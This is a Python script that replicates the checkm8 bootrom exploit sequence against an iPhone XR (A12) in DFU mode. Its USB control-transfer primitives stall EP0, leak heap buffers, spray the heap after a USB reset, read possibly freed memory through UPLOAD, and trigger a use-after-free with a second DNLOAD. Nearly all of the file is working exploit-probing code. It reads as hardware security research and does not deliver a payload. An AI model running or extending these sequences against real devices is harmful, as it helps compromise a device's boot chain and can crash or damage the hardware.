#!/usr/bin/env python3
"""
A12 SecureROM — Exact checkm8 Sequence Replication
=====================================================
Replicating the EXACT checkm8 flow from ipwndfu/checkm8.py,
adapted for A12 observation.

The REAL stall in checkm8 is NOT an OUT stall — it's an IN stall:
  GET_DESCRIPTOR(STRING, idx=4, lang=0x40A, len=0xC1) with 1ms timeout.
  
This cancels an IN control transfer mid-flight, leaving EP0 IN stalled.
The device's DWC USB controller EP0 state machine enters STALL.
After that, OUT transfers (DNLOAD) still work but the EP0 buffering
behaves differently.

For A11 (t8015), the flow is:
1. stall() — GET_DESCRIPTOR IN with 1ms timeout
2. leak() × N — DNLOAD(0x800 zeros) + GET_STATUS 
   (each leak allocates ZLP that doesn't get freed due to single abort)
3. USB reset — frees io_buffer, dangling pointer remains
4. Reconnect — heap spray with controlled data
5. Trigger — second DNLOAD hits the dangling pointer

For A12, the double-abort kills the ZLP leak in step 2.
But step 1 (IN stall) might create a DIFFERENT condition.

This script tests:
- Exact A11 checkm8 sequence on A12 hardware
- IN stall effects on EP0 state
- Whether IN stall changes UAF behavior
- Whether IN stall affects io_buffer allocation

Target: iPhone XR (A12/T8020) in DFU mode over USB 2.0
"""
import time, json, traceback
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC
DFU_PID   = 0x1227
BUF_SZ    = 0x800


def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S.%f')[:-3]}] {msg}", flush=True)


def backend():
    return usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)


def connect():
    d = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=backend())
    if d:
        try: d.set_configuration()
        except: pass
    return d


def alive():
    try: return usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=backend()) is not None
    except: return False


def get_status(d, to=2000):
    try:
        r = d.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=to)
        return {"bStatus": r[0], "bState": r[4]} if len(r) >= 6 else None
    except: return None


def clear_status(d):
    try: d.ctrl_transfer(0x21, 4, 0, 0, 0, timeout=2000)
    except: pass


def abort_dfu(d):
    try: d.ctrl_transfer(0x21, 6, 0, 0, 0, timeout=500)
    except: pass


def reset_idle(d):
    for _ in range(20):
        st = get_status(d)
        if not st: return False
        if st["bState"] == 2: return True
        if st["bState"] == 10: clear_status(d)
        else: abort_dfu(d)
        time.sleep(0.05)
    return False


def wait_dfu(timeout_s=90):
    log(f"  Waiting DFU (max {timeout_s}s)...")
    for i in range(timeout_s):
        d = connect()
        if d:
            st = get_status(d)
            if st:
                if st["bState"] == 10: clear_status(d)
                log(f"  Found after {i+1}s")
                return d
        time.sleep(1)
        if i % 10 == 9: log(f"  Still waiting ({i+1}s)...")
    return None


# ================================================================
# checkm8 primitive: stall() — IN stall via GET_DESCRIPTOR timeout
# ================================================================
def stall(d, timeout_ms=1):
    """
    Exact checkm8 stall: GET_DESCRIPTOR(STRING, idx=4, lang=0x40A, len=0xC1)
    with a very short timeout. The device starts sending STRING descriptor data 
    on EP0_IN, the host cancels, EP0_IN enters STALL state.
    
    Returns True if timeout occurred (stall created), False if completed.
    """
    try:
        d.ctrl_transfer(0x80, 6, 0x0304, 0x040A, 0xC1, timeout=timeout_ms)
        return False  # Completed without timeout — no stall
    except usb.core.USBTimeoutError:
        return True  # Timeout — stall likely created
    except usb.core.USBError as e:
        if "PIPE" in str(e) or "pipe" in str(e):
            return True  # Pipe error = stall
        log(f"    stall() error: {e}")
        return None  # Other error


# ================================================================
# checkm8 primitive: leak() — DNLOAD + delayed GET_STATUS
# ================================================================
def leak(d, timeout_ms=50):
    """
    checkm8 leak: send DNLOAD with 0x800 zero bytes, then GET_STATUS.
    On A11: the DNLOAD allocates io_buffer, the abort (from USB state
    machine race) leaks it. GET_STATUS triggers ZLP allocation.
    On A12: double-abort cleans up. But the sequence might still create
    interesting heap states.
    """
    try:
        d.ctrl_transfer(0x21, 1, 0, 0, b'\x00' * BUF_SZ, timeout=timeout_ms)
    except usb.core.USBTimeoutError:
        pass
    except usb.core.USBError:
        return False
    
    try:
        r = d.ctrl_transfer(0xA1, 3, 0, 0, 6, timeout=timeout_ms)
        return True
    except:
        return False


# ================================================================
# checkm8 primitive: no_leak() — just DNLOAD, no status check
# ================================================================
def no_leak(d, timeout_ms=50):
    """DNLOAD without GET_STATUS — doesn't create ZLP leak."""
    try:
        d.ctrl_transfer(0x21, 1, 0, 0, b'\x00' * BUF_SZ, timeout=timeout_ms)
        return True
    except usb.core.USBTimeoutError:
        return True  # Timeout but data may have been sent
    except usb.core.USBError:
        return False


# ================================================================
# TEST A: IN stall characterization
# ================================================================
def test_a_stall_characterize(d):
    """
    Test what happens when we create an IN stall on EP0.
    - Does GET_DESCRIPTOR timeout actually stall EP0?
    - What state is the device in after stall?
    - Can we still interact after stall?
    """
    log("\n" + "="*60)
    log("TEST A: IN stall characterization")
    log("="*60)
    
    results = []
    
    # A1: Basic stall
    log("\n  A1: Basic GET_DESCRIPTOR stall (timeout=1ms)")
    for i in range(5):
        d = connect()
        if not d:
            d = wait_dfu(60)
            if not d: break
        reset_idle(d)
        
        st_before = get_status(d)
        
        t0 = time.perf_counter()
        stall_ok = stall(d, timeout_ms=1)
        t1 = time.perf_counter()
        dt = (t1-t0)*1000
        
        is_alive = alive()
        st_after = get_status(d) if is_alive else None
        
        r = {
            "attempt": i,
            "state_before": st_before["bState"] if st_before else None,
            "stall_ok": stall_ok,
            "time_ms": round(dt, 2),
            "alive": is_alive,
            "state_after": st_after["bState"] if st_after else None,
        }
        
        log(f"    #{i}: stall={stall_ok}, {dt:.2f}ms, alive={is_alive}, "
            f"state: {r['state_before']}→{r['state_after']}")
        
        # Can we still do DNLOAD after stall?
        if is_alive:
            try:
                d.ctrl_transfer(0x21, 1, 0, 0, b"\xAA" * 64, timeout=1000)
                r["dnload_after_stall"] = True
                st = get_status(d)
                r["dnload_state"] = st["bState"] if st else None
                log(f"    DNLOAD after stall: OK, state={r['dnload_state']}")
            except usb.core.USBError as e:
                r["dnload_after_stall"] = False
                r["dnload_error"] = str(e)
                log(f"    DNLOAD after stall: {e}")
        
        results.append(r)
        
        if not alive():
            d = wait_dfu(60)
    
    # A2: Stall with longer timeout (catch devices that respond slow)
    log("\n  A2: Stall with various timeouts")
    for to in [1, 2, 5, 10, 50, 100]:
        d = connect()
        if not d:
            d = wait_dfu(60)
            if not d: break
        reset_idle(d)
        
        t0 = time.perf_counter()
        stall_ok = stall(d, timeout_ms=to)
        t1 = time.perf_counter()
        dt = (t1-t0)*1000
        
        is_alive = alive()
        r = {
            "timeout": to,
            "stall_ok": stall_ok,
            "time_ms": round(dt, 2),
            "alive": is_alive,
        }
        log(f"    timeout={to}ms: stall={stall_ok}, {dt:.2f}ms, alive={is_alive}")
        results.append(r)
        
        if not alive():
            d = wait_dfu(60)
    
    # A3: Multiple stalls in sequence
    log("\n  A3: Multiple stalls in sequence")
    d = connect()
    if not d: d = wait_dfu(60)
    if d:
        reset_idle(d)
        stall_count = 0
        for i in range(20):
            ok = stall(d, timeout_ms=1)
            if not alive():
                log(f"    Crashed after {i+1} stalls")
                results.append({"variant": "multi_stall", "crashed_after": i+1})
                d = wait_dfu(60)
                break
            stall_count += 1
        else:
            log(f"    {stall_count} stalls — device still alive!")
            st = get_status(d)
            results.append({
                "variant": "multi_stall", 
                "survived": stall_count,
                "state": st["bState"] if st else None
            })
    
    return results


# ================================================================
# TEST B: Exact checkm8 sequence (A11-style) on A12
# ================================================================
def test_b_exact_checkm8(d):
    """
    Replicate the exact checkm8 exploit flow for A11 on A12 hardware.
    See what happens differently.
    """
    log("\n" + "="*60)
    log("TEST B: Exact checkm8 A11 sequence on A12")
    log("="*60)
    
    results = []
    
    for leak_rounds in [1, 3, 10, 30]:
        d = connect()
        if not d:
            d = wait_dfu(60)
            if not d: break
        reset_idle(d)
        
        log(f"\n  checkm8 with {leak_rounds} leak rounds:")
        seq = {"leak_rounds": leak_rounds, "events": []}
        
        # Step 1: Stall
        log(f"    Step 1: stall()")
        stall_ok = stall(d, timeout_ms=1)
        seq["stall_ok"] = stall_ok
        
        if not alive():
            seq["events"].append("crashed_at_stall")
            results.append(seq)
            d = wait_dfu(60)
            continue
        
        # Step 2: leak() rounds
        log(f"    Step 2: {leak_rounds}x leak()")
        leaked = 0
        for i in range(leak_rounds):
            ok = leak(d, timeout_ms=100)
            if not alive():
                log(f"    Crashed at leak round {i+1}")
                seq["events"].append(f"crashed_at_leak_{i+1}")
                break
            leaked += 1
        seq["leaks_completed"] = leaked
        
        if not alive():
            results.append(seq)
            d = wait_dfu(60)
            continue
        
        log(f"    {leaked}/{leak_rounds} leaks completed")
        
        # Step 3: no_leak()
        log(f"    Step 3: no_leak()")
        nl = no_leak(d, timeout_ms=100)
        seq["no_leak_ok"] = nl
        
        if not alive():
            seq["events"].append("crashed_at_no_leak")
            results.append(seq)
            d = wait_dfu(60)
            continue
        
        # Step 4: USB reset
        log(f"    Step 4: USB reset")
        try:
            d.reset()
        except usb.core.USBError:
            pass
        time.sleep(0.5)
        
        # Step 5: Reconnect
        d2 = connect()
        if not d2:
            # Short wait and retry
            time.sleep(1)
            d2 = connect()
        
        if not d2:
            seq["events"].append("lost_after_reset")
            results.append(seq)
            d = wait_dfu(60)
            continue
        
        st = get_status(d2)
        seq["state_after_reset"] = st["bState"] if st else None
        log(f"    Reconnected. State={st['bState'] if st else 'NONE'}")
        
        if st and st["bState"] == 10:
            clear_status(d2)
        
        # Step 6: Heap spray (GET_STATUS × 128)
        log(f"    Step 6: Heap spray (GET_STATUS ×128)")
        for _ in range(128):
            get_status(d2, to=100)
        
        if not alive():
            seq["events"].append("crashed_during_spray")
            results.append(seq)
            d = wait_dfu(60)
            continue
        
        # Step 7: UPLOAD — try to read leaked heap data
        log(f"    Step 7: UPLOAD attempt")
        try:
            up = d2.ctrl_transfer(0xA1, 2, 0, 0, BUF_SZ, timeout=1000)
            seq["upload_len"] = len(up)
            seq["upload_nonzero"] = any(b != 0 for b in up)
            if any(b != 0 for b in up):
                hex_data = up[:64].tobytes().hex()
                log(f"    *** UPLOAD DATA: {hex_data} ***")
                seq["upload_hex"] = hex_data
            else:
                log(f"    UPLOAD: {len(up)}B, all zeros")
        except usb.core.USBError as e:
            seq["upload_error"] = str(e)
            log(f"    UPLOAD: {e}")
        
        if not alive():
            seq["events"].append("crashed_at_upload")
            results.append(seq)
            d = wait_dfu(60)
            continue
        
        # Step 8: Trigger — DNLOAD with controlled payload
        log(f"    Step 8: Trigger DNLOAD")
        reset_idle(d2)
        
        try:
            d2.ctrl_transfer(0x21, 1, 0, 0, b"\xAA" * BUF_SZ, timeout=2000)
            abort_dfu(d2)
            st = get_status(d2)
            if st and st["bState"] == 10: clear_status(d2)
            
            # Second DNLOAD — UAF trigger
            t0 = time.perf_counter()
            d2.ctrl_transfer(0x21, 1, 0, 0, b"\x55" * BUF_SZ, timeout=2000)
            t1 = time.perf_counter()
            dt = (t1-t0)*1000
            
            if alive():
                log(f"    *** UAF SURVIVED ({dt:.2f}ms) ***")
                seq["uaf_survived"] = True
                seq["events"].append("UAF_SURVIVED")
            else:
                log(f"    UAF crashed ({dt:.2f}ms)")
                seq["uaf_survived"] = False
        except usb.core.USBError as e:
            seq["uaf_survived"] = False
            seq["uaf_error"] = str(e)
            log(f"    UAF error: {e}")
        
        results.append(seq)
        
        if not alive():
            d = wait_dfu(60)
    
    return results


# ================================================================
# TEST C: Stall + DNLOAD + ABORT (UAF with stalled EP0)
# ================================================================
def test_c_stall_uaf(d):
    """
    Test if having EP0_IN stalled changes the UAF behavior.
    
    Hypothesis: when EP0_IN is stalled, the abort() handling 
    might work differently (maybe the double-abort doesn't fire
    because EP0_IN is stalled?).
    """
    log("\n" + "="*60)
    log("TEST C: Stall + UAF (does IN stall affect abort behavior?)")
    log("="*60)
    
    results = []
    
    for num_stalls in [0, 1, 5, 10]:
        d = connect()
        if not d:
            d = wait_dfu(60)
            if not d: break
        reset_idle(d)
        
        log(f"\n  {num_stalls} stalls before UAF:")
        seq = {"stalls": num_stalls, "events": []}
        
        # Create stalls
        for i in range(num_stalls):
            ok = stall(d, timeout_ms=1)
            if not alive():
                seq["events"].append(f"crashed_at_stall_{i+1}")
                break
        
        if not alive():
            results.append(seq)
            d = wait_dfu(60)
            continue
        
        st = get_status(d)
        seq["state_after_stalls"] = st["bState"] if st else None
        log(f"    State after {num_stalls} stalls: {st['bState'] if st else 'NONE'}")
        
        # Now do DNLOAD → ABORT → check
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, b"\xAA" * BUF_SZ, timeout=2000)
            seq["dnload1_ok"] = True
        except usb.core.USBError as e:
            seq["dnload1_ok"] = False
            seq["dnload1_error"] = str(e)
            if not alive():
                results.append(seq)
                d = wait_dfu(60)
                continue
        
        abort_dfu(d)
        st = get_status(d)
        if st and st["bState"] == 10: clear_status(d)
        seq["state_after_abort"] = st["bState"] if st else None
        
        # UPLOAD — read from potentially freed io_buffer
        try:
            up = d.ctrl_transfer(0xA1, 2, 0, 0, BUF_SZ, timeout=1000)
            seq["upload_len"] = len(up)
            seq["upload_nonzero"] = any(b != 0 for b in up)
            if any(b != 0 for b in up):
                hex_data = up[:64].tobytes().hex()
                log(f"    UPLOAD after abort: data! {hex_data}")
                seq["upload_hex"] = hex_data
            else:
                log(f"    UPLOAD after abort: {len(up)}B zeros")
        except usb.core.USBError as e:
            seq["upload_error"] = str(e)
            log(f"    UPLOAD after abort: {e}")
        
        if not alive():
            seq["events"].append("crashed_at_upload")
            results.append(seq)
            d = wait_dfu(60)
            continue
        
        # Second DNLOAD — UAF trigger
        t0 = time.perf_counter()
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, b"\x55" * BUF_SZ, timeout=2000)
            t1 = time.perf_counter()
            dt = (t1-t0)*1000
            
            if alive():
                log(f"    *** STALL({num_stalls}) + UAF SURVIVED ({dt:.2f}ms) ***")
                seq["uaf_survived"] = True
                seq["events"].append("UAF_SURVIVED")
            else:
                log(f"    Stall({num_stalls}) + UAF crashed ({dt:.2f}ms)")
                seq["uaf_survived"] = False
        except usb.core.USBError as e:
            seq["uaf_survived"] = False
            seq["uaf_error"] = str(e)
        
        results.append(seq)
        
        if not alive():
            d = wait_dfu(60)
    
    return results


# ================================================================
# TEST D: Stall + DNLOAD + stall + ABORT (interleaved)
# ================================================================
def test_d_interleaved(d):
    """
    Interleave stalls with DNLOAD/ABORT to see if stalling between
    operations changes the heap behavior.
    
    Hypothesis: stall between DNLOAD and ABORT might prevent the
    double-abort from firing because EP0_IN is busy/stalled.
    """
    log("\n" + "="*60)
    log("TEST D: Interleaved stall + DNLOAD + stall + ABORT")
    log("="*60)
    
    results = []
    
    sequences = [
        # name, sequence of operations
        ("stall_dnload_stall_abort", ["stall", "dnload", "stall", "abort"]),
        ("dnload_stall_abort", ["dnload", "stall", "abort"]),
        ("stall_dnload_abort_stall", ["stall", "dnload", "abort", "stall"]),
        ("dnload_abort_stall_dnload", ["dnload", "abort", "stall", "dnload"]),
        ("stall_dnload_stall_abort_dnload", ["stall", "dnload", "stall", "abort", "dnload"]),
    ]
    
    for name, ops in sequences:
        d = connect()
        if not d:
            d = wait_dfu(60)
            if not d: break
        reset_idle(d)
        
        log(f"\n  Sequence: {name}")
        seq = {"name": name, "ops": ops, "events": []}
        crashed = False
        
        for i, op in enumerate(ops):
            if crashed:
                break
            
            t0 = time.perf_counter()
            try:
                if op == "stall":
                    ok = stall(d, timeout_ms=1)
                    seq["events"].append(f"{op}:{ok}")
                elif op == "dnload":
                    d.ctrl_transfer(0x21, 1, 0, 0, b"\xAA" * BUF_SZ, timeout=2000)
                    seq["events"].append(f"{op}:ok")
                elif op == "abort":
                    abort_dfu(d)
                    st = get_status(d)
                    if st and st["bState"] == 10: clear_status(d)
                    seq["events"].append(f"{op}:state={st['bState'] if st else '?'}")
            except usb.core.USBError as e:
                seq["events"].append(f"{op}:err={e}")
            
            t1 = time.perf_counter()
            
            if not alive():
                seq["events"].append(f"CRASHED after {op} (step {i+1})")
                crashed = True
        
        if not crashed:
            # Check final state
            st = get_status(d)
            seq["final_state"] = st["bState"] if st else None
            seq["alive"] = True
            log(f"    Completed. State={st['bState'] if st else 'NONE'}")
            log(f"    Events: {seq['events']}")
        else:
            seq["alive"] = False
            log(f"    CRASHED. Events: {seq['events']}")
            d = wait_dfu(60)
        
        results.append(seq)
    
    return results


# ================================================================
# TEST E: checkm8 stall + DNLOAD timeout race
# ================================================================
def test_e_timeout_race(d):
    """
    The key insight from re-reading checkm8: the DNLOAD in leak()
    uses a SHORT timeout (50ms). If it times out, the host cancels
    the transfer mid-DATA phase. On USB 2.0, this means the device
    received SETUP + partial DATA, but STATUS never came.
    
    This is the REAL stall creation mechanism for OUT transfers!
    Not the GET_DESCRIPTOR — that's supplementary. The DNLOAD with
    timeout is what creates the incomplete transfer.
    
    With timeout=50ms and 2048 bytes (32 EP0 packets × 64B):
    - USB 2.0 HS: each packet takes ~0.5µs, total ~16µs
    - But with NAK retries and scheduling, might take longer
    - If device is slow to ACK (due to IN stall), timeout hits
    """
    log("\n" + "="*60)
    log("TEST E: DNLOAD timeout race (the REAL stall mechanism)")
    log("="*60)
    
    results = []
    
    # E1: DNLOAD with various tiny timeouts
    log("\n  E1: DNLOAD with tiny timeouts")
    for to_ms in [1, 2, 3, 5, 10, 20, 50]:
        d = connect()
        if not d:
            d = wait_dfu(60)
            if not d: break
        reset_idle(d)
        
        t0 = time.perf_counter()
        timed_out = False
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, b"\x00" * BUF_SZ, timeout=to_ms)
        except usb.core.USBTimeoutError:
            timed_out = True
        except usb.core.USBError as e:
            pass
        t1 = time.perf_counter()
        dt = (t1-t0)*1000
        
        is_alive = alive()
        st = get_status(d) if is_alive else None
        
        r = {
            "timeout_ms": to_ms, "timed_out": timed_out,
            "actual_time_ms": round(dt, 2), "alive": is_alive,
            "state": st["bState"] if st else None
        }
        log(f"    timeout={to_ms}ms: timed_out={timed_out}, {dt:.2f}ms, alive={is_alive}, state={r['state']}")
        results.append(r)
        
        if not alive(): d = wait_dfu(60)
    
    # E2: Stall THEN DNLOAD with timeout (checkm8-style)
    log("\n  E2: Stall + DNLOAD with timeout")
    for to_ms in [1, 5, 10, 50]:
        d = connect()
        if not d:
            d = wait_dfu(60)
            if not d: break
        reset_idle(d)
        
        # Create IN stall first
        stall_ok = stall(d, timeout_ms=1)
        
        if not alive():
            results.append({"variant": "stall_dnload", "timeout": to_ms, "crashed_at_stall": True})
            d = wait_dfu(60)
            continue
        
        # Now DNLOAD with the device's EP0_IN stalled
        t0 = time.perf_counter()
        timed_out = False
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, b"\x00" * BUF_SZ, timeout=to_ms)
        except usb.core.USBTimeoutError:
            timed_out = True
        except usb.core.USBError:
            pass
        t1 = time.perf_counter()
        dt = (t1-t0)*1000
        
        is_alive = alive()
        st = get_status(d) if is_alive else None
        
        r = {
            "variant": "stall_dnload", "timeout": to_ms,
            "stall_ok": stall_ok, "timed_out": timed_out,
            "actual_time_ms": round(dt, 2), "alive": is_alive,
            "state": st["bState"] if st else None
        }
        log(f"    stall→DNLOAD(timeout={to_ms}ms): timed_out={timed_out}, {dt:.2f}ms, alive={is_alive}")
        results.append(r)
        
        if not alive(): d = wait_dfu(60)
    
    # E3: Stall + DNLOAD_timeout + ABORT + second_DNLOAD
    log("\n  E3: Stall + DNLOAD(timeout) + ABORT + DNLOAD (UAF test)")
    for to_ms in [1, 5, 50]:
        d = connect()
        if not d:
            d = wait_dfu(60)
            if not d: break
        reset_idle(d)
        
        log(f"\n    Full sequence, DNLOAD timeout={to_ms}ms:")
        
        # Stall
        stall_ok = stall(d, timeout_ms=1)
        if not alive():
            results.append({"variant": "full_sequence", "timeout": to_ms, "crashed_at_stall": True})
            d = wait_dfu(60)
            continue
        
        # DNLOAD with timeout
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, b"\x00" * BUF_SZ, timeout=to_ms)
        except (usb.core.USBTimeoutError, usb.core.USBError):
            pass
        
        if not alive():
            results.append({"variant": "full_sequence", "timeout": to_ms, "crashed_at_dnload": True})
            d = wait_dfu(60)
            continue
        
        # Abort
        abort_dfu(d)
        st = get_status(d)
        if st and st["bState"] == 10: clear_status(d)
        
        if not alive():
            results.append({"variant": "full_sequence", "timeout": to_ms, "crashed_at_abort": True})
            d = wait_dfu(60)
            continue
        
        # Second DNLOAD — UAF trigger
        t0 = time.perf_counter()
        try:
            d.ctrl_transfer(0x21, 1, 0, 0, b"\x55" * BUF_SZ, timeout=2000)
            t1 = time.perf_counter()
            dt = (t1-t0)*1000
            
            if alive():
                log(f"    *** UAF SURVIVED! ({dt:.2f}ms) ***")
                results.append({"variant": "full_sequence", "timeout": to_ms, "uaf_survived": True, "time_ms": round(dt, 2)})
            else:
                log(f"    UAF crashed ({dt:.2f}ms)")
                results.append({"variant": "full_sequence", "timeout": to_ms, "uaf_survived": False})
                d = wait_dfu(60)
        except usb.core.USBError as e:
            results.append({"variant": "full_sequence", "timeout": to_ms, "uaf_error": str(e)})
            if not alive(): d = wait_dfu(60)
    
    return results


# ================================================================
# MAIN
# ================================================================
def main():
    log("=" * 60)
    log("A12 SecureROM — Exact checkm8 Sequence Replication")
    log("Target: iPhone XR (T8020) in DFU mode (USB 2.0)")
    log("=" * 60)
    
    d = connect()
    if not d:
        log("No DFU device. Put iPhone in DFU mode.")
        d = wait_dfu(120)
        if not d:
            log("FATAL: no device")
            return
    
    log(f"USB speed: {d.speed}, bcdUSB: 0x{d.bcdUSB:04x}")
    st = get_status(d)
    log(f"State: {st['bState'] if st else 'UNKNOWN'}")
    if st and st["bState"] == 10: clear_status(d)
    
    all_results = {}
    
    tests = [
        ("A", "IN stall characterization", test_a_stall_characterize),
        ("B", "Exact checkm8 A11 sequence", test_b_exact_checkm8),
        ("C", "Stall + UAF interaction", test_c_stall_uaf),
        ("D", "Interleaved stall+DNLOAD", test_d_interleaved),
        ("E", "DNLOAD timeout race", test_e_timeout_race),
    ]
    
    for tid, name, fn in tests:
        log(f"\n{'#'*60}")
        log(f"# {tid}: {name}")
        log(f"{'#'*60}")
        
        d = connect()
        if not d: d = wait_dfu(60)
        if d: reset_idle(d)
        
        try:
            r = fn(d)
            all_results[tid] = r
        except Exception as e:
            log(f"  EXCEPTION: {e}")
            traceback.print_exc()
            all_results[tid] = {"error": str(e)}
    
    # Save
    outf = Path(__file__).parent / "results" / "checkm8_exact_results.json"
    outf.parent.mkdir(exist_ok=True)
    with open(outf, "w") as f:
        json.dump({
            "timestamp": datetime.now().isoformat(),
            "device": "iPhone XR (A12/T8020)",
            "results": all_results
        }, f, indent=2)
    
    log(f"\n{'='*60}")
    log(f"Results saved: {outf}")
    log(f"{'='*60}")
    
    # Highlights
    log("\n=== CRITICAL FINDINGS ===")
    for tid, data in all_results.items():
        if isinstance(data, list):
            for r in data:
                if r.get("uaf_survived"):
                    log(f"  *** {tid}: UAF SURVIVED! {r}")
                if r.get("upload_nonzero"):
                    log(f"  *** {tid}: UPLOAD LEAKED DATA! {r.get('upload_hex', '')[:40]}")
                if r.get("stall_ok") is True and r.get("timed_out"):
                    log(f"  ** {tid}: Stall+timeout combo: {r}")

if __name__ == "__main__":
    main()
